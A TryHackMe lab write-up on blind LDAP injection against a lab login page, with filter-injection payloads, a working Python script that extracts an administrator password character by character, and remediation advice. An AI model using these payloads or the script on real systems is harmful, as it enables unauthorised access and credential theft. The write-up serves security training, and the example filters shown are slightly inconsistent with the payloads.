# LDAP Injection — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Topic](https://img.shields.io/badge/Topic-Blind_LDAP_Injection-purple.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete penetration testing writeup for the **LDAP Injection** room on TryHackMe, demonstrating blind boolean-based character extraction from directory search filters.

---

## 📋 Executive Summary
Lightweight Directory Access Protocol (LDAP) injection occurs when unvalidated user input is concatenated into LDAP search query filters. In this room, the target application (`http://10.48.161.96/blind.php`) evaluates user authentication via an LDAP filter. Because direct credential disclosure is withheld, blind boolean LDAP injection was executed using wildcard matching `*)(|(&` and automated Python character probing (`script.py`) to reconstruct administrative passwords.

* **Target URL:** `http://10.48.161.96/blind.php`
* **Vulnerability:** Blind Boolean LDAP Search Filter Injection
* **Artifacts in Directory:**
  * `script.py`: Custom Python automated blind LDAP extractor

---

## 🔍 Stage 1: Vulnerability Mechanics

### 1.1 The Backend Query Structure
The authentication backend constructs an LDAP query resembling:
```text
(&(username=USER_INPUT)(password=PASS_INPUT))
```

### 1.2 Injecting Filter Logic
If we provide `*` as the username:
```text
(&(username=*)(password=PASS_INPUT))
```
The query returns true for any valid account.

To perform blind character-by-character password recovery, we craft an injection that forces the query to evaluate user-controlled substrings using wildcard matching:
```text
username: admin)(password=a*)(&
```
Resulting filter:
```text
(&(username=admin)(password=a*)(&)(password=dummy))
```
If the password starts with `a`, the query succeeds (indicated by a green success paragraph `<p style="color: green;">`). If incorrect, the server returns a failure response.

---

## 🛠️ Stage 2: Automated Extraction (`script.py`)

We automated the blind character exfiltration using Python:
```python
import requests
from bs4 import BeautifulSoup
import string

url = 'http://10.48.161.96/blind.php'
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"
successful_chars = ''

while True:
    found_char = False
    for char in char_set:
        # Construct blind wildcard probe
        data = {
            'username': f'admin)(password={successful_chars}{char}*)(|(&',
            'password': 'pwd'
        }
        resp = requests.post(url, data=data)
        soup = BeautifulSoup(resp.content, 'html.parser')

        # Check for success indicator
        if soup.find_all('p', style='color: green;'):
            successful_chars += char
            print(f"[+] Found character: {char} -> Current: {successful_chars}")
            found_char = True
            break

    if not found_char:
        print("\n[✓] Completed extraction.")
        break

print(f"[✓] Extracted Password: {successful_chars}")
```

Running `script.py` extracts the target administrator credentials character by character.

---

## 🛡️ Remediation
1. **Parameterized LDAP Queries:** Use framework libraries supporting safe parameterized LDAP lookups instead of dynamic string concatenation.
2. **Input Sanitization:** Escape special LDAP filter characters (`(`, `)`, `*`, `\`, `NUL`, `/`) in all user-supplied variables:
   * Replace `(` with `\28`
   * Replace `)` with `\29`
   * Replace `*` with `\2a`
   * Replace `\` with `\5c`
3. **Principle of Least Privilege:** Configure the LDAP binding service account with read-only access limited strictly to required directory attributes.
